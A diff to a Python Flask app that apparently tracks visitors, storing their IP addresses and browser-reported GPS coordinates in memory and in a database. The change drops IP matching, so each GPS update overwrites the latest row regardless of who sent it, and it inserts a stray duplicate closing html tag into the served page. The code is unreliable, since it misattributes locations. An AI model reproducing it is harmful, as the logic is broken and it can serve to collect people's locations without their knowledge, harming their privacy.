@@ -647,20 +647,28 @@ def track_page():
         </script>
     </body>
     </html>
+      </html>
     """
+
 
 @app.route("/gps-update")
 def gps_update():
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
 
-    if ip and "," in ip:
-        ip = ip.split(",")[0].strip()
+    global logs
 
     lat = request.args.get("lat")
     lon = request.args.get("lon")
     accuracy = request.args.get("accuracy")
 
+    # Update latest memory log
+    if logs:
+        logs[-1]["gps_lat"] = lat
+        logs[-1]["gps_lon"] = lon
+        logs[-1]["gps_accuracy"] = accuracy
+
+    # Update latest database row
     if DATABASE_URL:
+
         conn = get_db_connection()
         cur = conn.cursor()
 
@@ -671,15 +679,13 @@ def gps_update():
                 gps_accuracy = %s
             WHERE id = (
                 SELECT id FROM logs
-                WHERE ip = %s
                 ORDER BY id DESC
                 LIMIT 1
             )
         """, (
             lat,
             lon,
-            accuracy,
-            ip
+            accuracy
         ))
 
         conn.commit()
